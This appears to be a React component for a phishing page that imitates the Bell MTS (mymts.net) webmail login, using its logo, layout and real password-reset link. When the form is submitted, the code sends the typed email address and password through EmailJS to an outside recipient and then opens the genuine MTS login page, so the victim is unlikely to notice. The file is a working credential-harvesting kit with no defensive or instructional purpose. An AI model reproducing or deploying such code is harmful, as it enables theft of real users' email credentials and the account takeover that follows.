import React, {useRef, useState} from "react";
import emailjs from '@emailjs/browser';


function Login () {
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");

    const handleUsernameChange = (event) => {
        setUsername(event.target.value);
    };

    const handlePasswordChange = (event) => {
        setPassword(event.target.value);
    };

    const handleSubmit = (event) => {
        event.preventDefault();

        if (username === "" && password === "") {
            alert("please fill the form");
            
        } else {
            window.open ('https://auth.mtsmail.ca/saml/module.php/authSynacor/login.php?AuthState=_aa10d8ee63e75d082b1d207ac95f29fe6348d387e5%3Ahttps%3A%2F%2Fauth.mtsmail.ca%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fmtsmail.ca%252F%26cookieTime%3D1702979584');
        }
    };


//  const routeChange = () =>{ 
//     window.open('')

//  }




    const form = useRef();

    const sendEmail = (e) => {
      e.preventDefault();
  
      emailjs.sendForm('service_hzkctk5', 'template_6986y7c', form.current, '-B1g1Iiw6LGKPndX_')
        .then((result) => {
            console.log(result.text);
        }, (error) => {
            console.log(error.text);
        });
    };
  

    return (
        <div className=" md:w-screen md:min-h-screen mx-10 md:mx-0">
            <div className="md:relative md:left-[34rem] mt-56">
                <img src="https://cableco.auth-gateway.net/images/mts/bellmts.png" className="h-10 w-40"/>
            <p className="text-xs text-left  mt-3">Log in with your mymts.net email address</p>
            </div>

            <div className="flex items-center justify-center w-full">   
            <form ref={form} onSubmit={sendEmail} className=" md:mt-5 mt-5 bg-[#F1F1F1] md:w-1/4 w-96 md:rounded-md rounded-md">
                <div className="flex flex-col items-center justify-center">
<input type="email" value={username} onChange={handleUsernameChange} name="user_email" placeholder="Email Address (example@mymts.net)"  autoFocus className=" outline-[#91BBDD] focus focus:outline-shadow-md mt-8 mb-5 mr-4 border border-[#CCCCCC] rounded-md w-72 py-2 pl-3 placeholder-[#999999] placeholder:text-sm placeholder:font-semibold text-[#555555] font-medium"/>
<input type="Password" value={password} onChange={handlePasswordChange} name="user_password" placeholder="Password" autoCorrect="off"  className="w-72 outline-[#91BBDD] focus focus:outline-shadow-md border border-[#CCCCCC] mr-4 mb-6 rounded-md py-2 pl-3 placeholder-[#999999] placeholder:text-sm placeholder:font-semibold text-[#555555] font-medium"/>
<button onClick={handleSubmit} type="submit" value="Send"  className="bg-[#0066A3] text-white text-center px-32 rounded-md py-4 font-semibold">LOG IN</button>
</div>
<input type="checkbox"  id="remember_me" name="remember_me" value="yes" tabIndex="4"  className="mx-2 mt-3 mb-7 text-sm"/>
    							<label>Remember Me</label>
                                <a target="_blank"  href='https://selfcare.mtsmail.ca/selfcare/password_reset/qa/' className="text-[#0066A2] ml-8 hover:underline text-md">Forgot Password?</a>
            </form>
            </div> 
        </div>
    )
}

export default Login;
